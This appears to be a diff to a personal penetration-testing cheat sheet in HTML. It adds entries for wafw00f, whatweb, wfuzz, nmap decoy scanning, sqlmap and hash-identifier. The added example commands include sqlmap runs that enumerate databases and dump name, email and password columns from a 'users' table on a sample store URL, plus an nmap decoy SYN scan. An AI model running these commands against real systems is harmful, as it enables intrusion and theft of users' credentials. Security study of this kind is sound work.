@@ -526,18 +526,50 @@
 
       <li>
         ├ <span class="cmd">bgpview.io/bgp.net</span>
-        <span class="exp">: websites, info like asn/netblock, if there's a dns </span>
+        <span class="exp">: websites info like asn/netblock, if there's a dns  </span>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">wafw00f</span>
+        <span class="exp">: web app firewall toolkit (checks for firewall) </span>
+				<br>│ <span class="ident">
+          <span class="opt">-v </span>
+          <span class="exp">: verbose</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">-r </span>
+          <span class="exp">: don't follow redirect (300)</span>
+        </span>
+				<br> │ <code>wafw00f -v testphp.vulnweb.com</code>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">whatweb</span>
+        <span class="exp">: discover web thecnologies being used </span>
+				<br>│ <span class="ident">
+          <span class="opt">-v </span>
+          <span class="exp">: verbose</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">-a <span class="param">int</span> </span>
+          <span class="exp">: agressivy, 1, 3 and 4</span>
+					<br> │ <code>whatweb -a 3 http://testphp.vulnweb.com</code>
+        </span>
       </li>
 
 			<p>├────────────────────────────────────────────────────────────────</p>
 
 			<li>
-				├ <span class="cmd">ffuf</span> <span class="exp">: dns fuzzer</span>
+				├ <span class="cmd">ffuf</span> <span class="exp">: web fuzzer</span>
 				<br> │ <span class="ident">
 					<span class="opt">-u <span class="param">url</span></span>
 					<span class="exp">: specifies url</span>
-					<br> │ <code class="etc">&lturl&gt:FUZZ to sppecify where to brute force</code>
 				</span>
+				<br> │ <code class="etc">&lturl&gt:FUZZ to sppecify where to brute force</code>
 				<br> │ <span class="ident">
 					<span class="opt">-w <span class="param">wordlist</span></span>
 					<span class="exp">: specifies worlist to use</span>
@@ -549,6 +581,28 @@
 				<br> │ <span class="ident">
 					<span class="opt">-recursion</span>
 					<span class="exp">: enables recursion</span>
+				</span>
+
+			<p>├────────────────────────────────────────────────────────────────</p>
+
+			<li>
+				├ <span class="cmd">wfuzz</span> <span class="exp">: web fuzzer</span>
+				<br> │ <span class="ident">
+					<span class="opt">-c </span>
+					<span class="exp">: enables colored output</span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-l <span class="param">type</span>,<span class="param">param</span></span>
+					<span class="exp">: what to use in fuzzing</span>
+				</span>
+				<br> │ <code class="etc">wfuzz -c -z file,wordlist.txt http://testphp.vulnweb.com?FUZZ=admin.php</code>
+				<br> │ <span class="ident">
+					<span class="opt">-hl/hw/hh <span class="param">int</span></span>
+					<span class="exp">: hide line/word/char with <span class="param">int</span></span>
+				</span>
+				<br> │ <span class="ident">
+					<span class="opt">-sl/sw/sh <span class="param">int</span></span>
+					<span class="exp">: only show line/word/char with <span class="param">int</span></span>
 				</span>
 			</li>
 
@@ -627,8 +681,13 @@
 				<br> │ <span class="ident">
 					<span class="opt">--script <span class="param">script</span></span>
 					<span class="exp">: specifies script to use</span>
-					<br> │ <code>nmap --script vuln 192.168.0.110</code>
 				</span>
+				<br> │ <code>nmap --script vuln 192.168.0.110</code>
+				<br> │ <span class="ident">
+					<span class="opt">--open</span>
+					<span class="exp">: show only open ports</span>
+				</span>
+				<br> │ <code>nmap -D RND:20 --open -sS -p- 192.168.0.1 -oN portsH</code>
 				<br> │ <span class="ident">
 					<span class="opt">-oN <span class="param">file</span></span>
 					<span class="exp">: writes to <span class="param">file</span></span>
@@ -639,12 +698,75 @@
 				</span>
 			</li>
 
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">sqlmap</span>
+        <span class="exp">: sql injection and info </span>
+				<br>│ <span class="ident">
+          <span class="opt">-v </span>
+          <span class="exp">: verbose</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">-u <span class="param">url</span></span>
+          <span class="exp">: specifies url</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">--current-db</span>
+          <span class="exp">: grabs current db in production</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">--threads <span class="param">int</span></span>
+          <span class="exp">: specifies how many threads to use</span>
+        </span>
+				<br> │ <code>sqlmap -u "store.com/prod.php?prod=844" --current-db</code>
+				<br> │ <code class="etc">OBS: needs to be an entry point</code>
+				<br>│ <span class="ident">
+          <span class="opt">-dbs </span>
+          <span class="exp">: grabs all dbs</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">-D <span class="param">db_name</span></span>
+          <span class="exp">: specifies db to get info</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">--tables</span>
+          <span class="exp">: grabs tables of specified db</span>
+        </span>
+				<br>│ <code>sqlmap -u "store.com/prod.php?prod=844" -D store --tables</code>
+				<br>│ <span class="ident">
+          <span class="opt">-T <span class="param">table</span></span>
+          <span class="exp">: specifies table to get info</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">--columns</span>
+          <span class="exp">: grabs columns of specifies table</span>
+        </span>
+				<br>│ <code>sqlmap -u "store.com/prod.php?prod=844" -D store -T users --columns</code>
+				<br>│ <span class="ident">
+          <span class="opt">-C <span class="param">column</span></span>
+          <span class="exp">: specifies xolumn to get info</span>
+        </span>
+				<br>│ <span class="ident">
+          <span class="opt">--dump</span>
+          <span class="exp">: grabs text of specifies table</span>
+        </span>
+				<br>│ <code>sqlmap -u "store.com/prod.php?prod=844" -D store -T users -C 'name,email,password' --dump</code>
+      </li>
+
 			<p>│</p>
       <p>│</p>
       <p>│ <span class="spacer">aaaa</span>┌──────────┐</p>
       ├─────┤<h3>Cracking</h3> │
       <p>│ <span class="spacer">aaaa</span>└──────────┘</p>
       <p>│</p>
+
+			<li>
+				├ <span class="cmd">hash-dentifier</span> <span class="exp">: identify hashes</span>
+				<br> │ <code>hash-identifier</code>
+			</li>
+
+			<p>├────────────────────────────────────────────────────────────────</p>
 
 			<li>
 				├ <span class="cmd">hydra</span> <span class="exp">: password cracker</span>
